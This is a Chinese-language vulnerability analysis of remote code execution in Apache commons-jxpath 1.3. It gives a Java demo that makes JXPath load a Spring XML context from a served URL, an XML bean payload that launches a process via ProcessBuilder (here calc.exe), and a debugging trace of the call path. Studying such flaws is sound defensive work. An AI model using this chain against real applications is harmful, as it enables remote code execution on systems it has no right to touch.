## 漏洞环境

目前影响到1.3

maven
```xml
<!-- https://mvnrepository.com/artifact/commons-jxpath/commons-jxpath -->
<dependency>
    <groupId>commons-jxpath</groupId>
    <artifactId>commons-jxpath</artifactId>
    <version>1.3</version>
</dependency>
```

demo
```java
package com.jxpath.demo;  
  
import org.apache.commons.jxpath.JXPathContext;  
  
public class demo {  
    public static void main(String[] args) {  
        try {  
            JXPathContext context = JXPathContext.newContext((Object)null);  
            String key = (String) context.getValue("org.springframework.context.support.ClassPathXmlApplicationContext.new(\"http://127.0.0.1:8000/bean.xml\")");  
            System.out.println(key);  
        } catch (Exception e){  
            System.out.println(e);  
        }  
    }  
}
```

exp
```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    普通方式创建类-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value>calc.exe</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```


## 调试

入口 getValue
![](attachments/Pasted%20image%2020230422154855.png)

在将xpath放到express中后又带入getValue

![](attachments/Pasted%20image%2020230422155340.png)

ExtensionFunction#computeValue

![](attachments/Pasted%20image%2020230422155530.png)

org/apache/commons/jxpath/ri/axes/RootContext.java#getFunction

![](attachments/Pasted%20image%2020230422155630.png)

org/apache/commons/jxpath/ri/JXPathContextReferenceImpl.java#getFunction

![](attachments/Pasted%20image%2020230422155749.png)

org/apache/commons/jxpath/PackageFunctions.java#getFunction

![](attachments/Pasted%20image%2020230422160210.png)

在下面根据是否new方法来来返回不同的function
- MethodLookupUtils.lookupConstructor
- MethodLookupUtils.lookupStaticMethod

![](attachments/Pasted%20image%2020230422161104.png)

在ConstructorFunction后，这就是前面get到的function

![](attachments/Pasted%20image%2020230422161631.png)

org/apache/commons/jxpath/functions/ConstructorFunction.java#invoke

![](attachments/Pasted%20image%2020230422161802.png)

constructor.newInstance后向上一直到`\org\springframework\spring-jcl\5.3.23\spring-jcl-5.3.23.jar!\org\apache\commons\logging\LogFactory.class` 进行getName

![](attachments/Pasted%20image%2020230422162046.png)

之后就是一直到refresh执行结弹出计算器

![](attachments/Pasted%20image%2020230422162504.png)

```java
public void refresh() throws BeansException, IllegalStateException {  
    synchronized(this.startupShutdownMonitor) {  
        StartupStep contextRefresh = this.applicationStartup.start("spring.context.refresh");  
        this.prepareRefresh();  
        ConfigurableListableBeanFactory beanFactory = this.obtainFreshBeanFactory();  
        this.prepareBeanFactory(beanFactory);  
  
        try {  
            this.postProcessBeanFactory(beanFactory);  
            StartupStep beanPostProcess = this.applicationStartup.start("spring.context.beans.post-process");  
            this.invokeBeanFactoryPostProcessors(beanFactory);  
            this.registerBeanPostProcessors(beanFactory);  
            beanPostProcess.end();  
            this.initMessageSource();  
            this.initApplicationEventMulticaster();  
            this.onRefresh();  
            this.registerListeners();  
            this.finishBeanFactoryInitialization(beanFactory);  
            this.finishRefresh();  
        } catch (BeansException var10) {  
            if (this.logger.isWarnEnabled()) {  
                this.logger.warn("Exception encountered during context initialization - cancelling refresh attempt: " + var10);  
            }  
  
            this.destroyBeans();  
            this.cancelRefresh(var10);  
            throw var10;  
        } finally {  
            this.resetCommonCaches();  
            contextRefresh.end();  
        }  
  
    }  
}
```